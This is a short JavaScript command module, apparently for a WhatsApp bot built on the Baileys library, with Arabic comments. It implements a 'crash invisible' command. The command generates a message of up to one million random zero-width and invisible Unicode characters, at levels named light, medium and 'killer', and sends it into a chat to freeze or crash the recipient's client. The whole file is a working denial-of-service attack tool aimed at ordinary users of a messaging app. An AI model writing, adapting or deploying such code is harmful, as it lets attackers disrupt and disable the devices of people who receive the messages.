module.exports = async ({ sock, msg, text, reply }) => {
    // إذا لم يبدأ النص بـ crash invisible
    if (!text.startsWith("crash invisible")) return;

    const jid = msg.key.remoteJid;

    // قائمة الرموز غير المرئية
    const invisibleChars = [
        "\u200B", // Zero Width Space
        "\u200C", // Zero Width Non-Joiner
        "\u200D", // Zero Width Joiner
        "\u200E", // Left-to-Right Mark
        "\u200F", // Right-to-Left Mark
        "\uFEFF", // Zero Width No-Break Space
        "\u2800", // Braille Blank
        "\u3164"  // Hangul Filler
    ];

    try {
        // تحديد المستوى
        let level = "killer"; // افتراضي
        if (text.includes("light")) level = "light";
        if (text.includes("medium")) level = "medium";
        if (text.includes("killer")) level = "killer";

        // تحديد حجم التكرار حسب المستوى
        let repeatCount;
        switch (level) {
            case "light":
                repeatCount = 50000; // خفيف
                break;
            case "medium":
                repeatCount = 200000; // متوسط
                break;
            case "killer":
                repeatCount = 1000000; // قاتل
                break;
            default:
                repeatCount = 1000000;
        }

        await reply(`⚠️ جاري توليد نص غير مرئي (${level})...`);

        // توليد النص
        let crashText = "";
        for (let i = 0; i < repeatCount; i++) {
            crashText += invisibleChars[Math.floor(Math.random() * invisibleChars.length)];
        }

        // إرسال النص الضخم
        await sock.sendMessage(jid, { text: crashText });

        await reply(`✅ تم إرسال الرسالة غير المرئية (${level}). افتح الدردشة بحذر!`);
    } catch (error) {
        console.error("Crash Invisible Error:", error);
        await reply("❌ حدث خطأ أثناء تنفيذ أمر الكراش غير المرئي.");
    }
};
